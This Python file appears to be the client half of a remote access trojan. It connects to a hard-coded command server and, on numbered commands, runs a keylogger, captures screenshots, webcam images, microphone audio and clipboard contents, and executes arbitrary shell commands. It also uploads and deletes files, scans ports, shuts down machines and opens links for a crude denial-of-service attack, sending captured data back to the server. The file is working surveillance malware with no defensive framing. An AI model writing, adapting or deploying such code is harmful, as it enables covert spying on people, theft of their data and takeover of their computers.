import time
import socket
import os
import platform
from datetime import datetime, timedelta
from pynput import keyboard
import subprocess
import pyautogui
import pyperclip
import cv2
import psutil
import sounddevice as sd
from scipy.io.wavfile import write

# Function to start the keylogger
def start_keylogger(s):
    log_file = f'{os.getcwd()}/keylogger.log'
    def on_press(key):
        try:
            with open(log_file, "a") as f:
                f.write(f'{key.char}')
        except AttributeError:
            with open(log_file, "a") as f:
                f.write(f'[{key}]')

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Keep the listener running
    listener.join()

    send_log_to_server(log_file, s)

# Function to send the log file to the server
def send_log_to_server(log_file, s):
    with open(log_file, 'rb') as f:
        data = f.read()
        file_name = os.path.basename(log_file)
        file_size = len(data)
        s.sendall(f"5|{file_name}|{file_size}".encode())  # Use command 5 for file transfer
        ack = s.recv(1024).decode()
        if ack == "READY":
            s.sendall(data)
            print(f"Log file {file_name} sent to server.")
        else:
            print("Server not ready for file transfer.")

# Function to execute port scan
def port_scan(target, ports):
    open_ports = []
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
        s.close()
    return open_ports

# Function to run nmap scan
def run_nmap_scan(target):
    try:
        result = subprocess.check_output(["nmap", "-sV", target])
        return result.decode()
    except FileNotFoundError:
        return "nmap not found. Please install nmap and ensure it is in your PATH."
    except subprocess.CalledProcessError as e:
        return f"nmap scan failed: {e}"

# Function to capture screenshot
def capture_screenshot(s):
    screenshot_path = f"{os.getcwd()}/screenshot.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    send_log_to_server(screenshot_path, s)

# Function to get clipboard content
def get_clipboard_content():
    try:
        return pyperclip.paste()
    except Exception as e:
        return f"Clipboard error: {e}"

# Function to capture webcam image
def capture_webcam_image(s):
    webcam = cv2.VideoCapture(0)
    ret, frame = webcam.read()
    if ret:
        image_path = f"{os.getcwd()}/webcam.jpg"
        cv2.imwrite(image_path, frame)
        send_log_to_server(image_path, s)
    webcam.release()

# Function to get system info
def get_system_info():
    info = {
        "platform": platform.system(),
        "platform-release": platform.release(),
        "platform-version": platform.version(),
        "architecture": platform.machine(),
        "hostname": platform.node(),
        "ip-address": socket.gethostbyname(socket.gethostname()),
        "processor": platform.processor(),
        "ram": str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
    }

    # Find available network interface for MAC address
    for iface_name, iface_data in psutil.net_if_addrs().items():
        if iface_data[0].family == socket.AF_INET:
            info["mac-address"] = iface_data[0].address

    return str(info)

# Function to get process list
def get_process_list():
    process_list = subprocess.check_output("tasklist" if platform.system() == "Windows" else "ps aux", shell=True)
    return process_list.decode()

# Function to record microphone
def record_microphone(s, duration=10):
    fs = 44100  # Sample rate
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until recording is finished
    audio_path = f"{os.getcwd()}/recording.wav"
    write(audio_path, fs, recording)  # Save as WAV file
    send_log_to_server(audio_path, s)

# Function to get network info
def get_network_info():
    network_info = psutil.net_if_addrs()
    return str(network_info)

# Function to list files
def list_files(directory):
    try:
        files = os.listdir(directory)
        return str(files)
    except Exception as e:
        return f"Directory listing error: {e}"

# Function to execute command
def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True)
        return output.decode()
    except Exception as e:
        return f"Command execution error: {e}"

# Function to get system uptime
def get_system_uptime():
    try:
        uptime_seconds = time.time() - psutil.boot_time()
        uptime_string = str(timedelta(seconds=uptime_seconds))
        return uptime_string
    except Exception as e:
        return f"Error retrieving system uptime: {e}"

# Client Code

def connect_to_server():
    while True:
        try:
            s = socket.socket()
            host = "192.168.1.20"
            port = 8080
            s.connect((host, port))
            print("Connected to server")
            return s
        except socket.error as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

def client_loop():
    while True:
        try:
            s = connect_to_server()
            while True:
                command = s.recv(1024).decode().strip()
                if not command:
                    print("Connection closed by server.")
                    break
                
                print(f"Received command: {command}")
                
                if command == "1":
                    print("Executing shutdown command.")
                    os.system("shutdown -s -t 00" if platform.system() == "Windows" else "shutdown now")
                elif command == "2":
                    print("Executing restart command.")
                    os.system("shutdown -r -t 00" if platform.system() == "Windows" else "reboot")
                elif command == "3":
                    print("Executing DOS Attack command.")
                    links = s.recv(4096).decode().strip().split(',')
                    for link in links:
                        os.system(f"start msedge.exe {link}" if platform.system() == "Windows" else f"xdg-open {link}")
                elif command == "4":
                    print("Executing file transfer command.")
                    file_info = s.recv(1024).decode().strip()
                    if "|" not in file_info:
                        print(f"Invalid file info received: {file_info}")
                        break
                    
                    file_name, file_size = file_info.split("|", 1)
                    try:
                        file_size = int(file_size)
                    except ValueError:
                        print("Invalid file size received.")
                        break
                    
                    s.sendall("READY".encode())
                    
                    with open(file_name, "wb") as f:
                        received_size = 0
                        while received_size < file_size:
                            data = s.recv(1024)
                            if not data:
                                print("Connection lost during file transfer.")
                                break
                            f.write(data)
                            received_size += len(data)
                    
                    if received_size == file_size:
                        print(f"File {file_name} received successfully.")
                    else:
                        print("File transfer incomplete.")
                    # Send acknowledgment after file transfer
                    s.sendall("DONE".encode())
                elif command == "5":
                    print("Executing remove file command.")
                    file_path = s.recv(1024).decode().strip()
                    try:
                        if os.path.exists(file_path):
                            os.remove(file_path)
                            print(f"File '{file_path}' removed successfully.")
                        else:
                            print(f"File '{file_path}' does not exist.")
                    except PermissionError:
                        print(f"Permission denied: Unable to remove file '{file_path}'.")
                    except Exception as e:
                        print(f"An error occurred: {e}")
                elif command == "6":
                    print("Executing keylogger command.")
                    start_keylogger(s)
                elif command == "7":
                    print("Executing exit command.")
                    print("Server requested disconnection.")
                    s.close()
                    break
                elif command == "8":
                    print("Executing port scan command.")
                    target = s.recv(1024).decode().strip()
                    ports = range(1, 1024)  # Common ports range
                    open_ports = port_scan(target, ports)
                    s.sendall(str(open_ports).encode())
                    print(f"Open ports on {target}: {open_ports}")
                elif command == "9":
                    print("Executing vulnerability scan command.")
                    target = s.recv(1024).decode().strip()
                    scan_result = run_nmap_scan(target)
                    s.sendall(scan_result.encode())
                    s.sendall("DONE".encode())  # Send acknowledgment after the response
                    print(f"Vulnerability scan result for {target} sent to server.")
                elif command == "10":
                    print("Executing screenshot capture command.")
                    capture_screenshot(s)
                    print("Screenshot captured and sent to server.")
                elif command == "11":
                    print("Executing clipboard monitoring command.")
                    clipboard_content = get_clipboard_content()
                    s.sendall(clipboard_content.encode())
                    print("Clipboard content sent to server.")
                elif command == "12":
                    print("Executing webcam capture command.")
                    capture_webcam_image(s)
                    print("Webcam image captured and sent to server.")
                elif command == "13":
                    print("Executing system info command.")
                    system_info = get_system_info()
                    s.sendall(system_info.encode())
                    s.sendall("DONE".encode())  # Send acknowledgment after the response
                    print("System information sent to server.")
                elif command == "14":
                    print("Executing process list command.")
                    processes = get_process_list()
                    s.sendall(processes.encode())
                    s.sendall("DONE".encode())  # Send acknowledgment after the response
                    print("Process list sent to server.")
                elif command == "15":
                    print("Executing microphone recording command.")
                    record_microphone(s)
                    s.sendall("DONE".encode())  # Send acknowledgment after the response
                    print("Microphone recording captured and sent to server.")
                elif command == "16":
                    print("Executing network information command.")
                    network_info = get_network_info()
                    s.sendall(network_info.encode())
                    s.sendall("DONE".encode())  # Send acknowledgment after the response
                    print("Network information sent to server.")
                elif command == "17":
                    print("Executing file system exploration command.")
                    directory = s.recv(1024).decode().strip()
                    files = list_files(directory)
                    s.sendall(files.encode())
                    s.sendall("DONE".encode())  # Send acknowledgment after the response
                    print(f"Files in directory {directory} sent to server.")
                elif command == "18":
                    print("Executing command execution command.")
                    shell_command = s.recv(1024).decode().strip()
                    output = execute_command(shell_command)
                    s.sendall(output.encode())
                    s.sendall("DONE".encode())  # Send acknowledgment after the response
                    print(f"Command '{shell_command}' executed and output sent to server.")
                elif command == "19":
                    print("Executing system uptime command.")
                    uptime = get_system_uptime()
                    s.sendall(uptime.encode())
                    s.sendall("DONE".encode())  # Send acknowledgment after the response
                    print("System uptime sent to server.")
                else:
                    print("Unknown command received.")
        except socket.error as e:
            print(f"Socket error: {e}")
            s.close()
            time.sleep(5)  # Wait before reconnecting
            continue

if __name__ == "__main__":
    client_loop()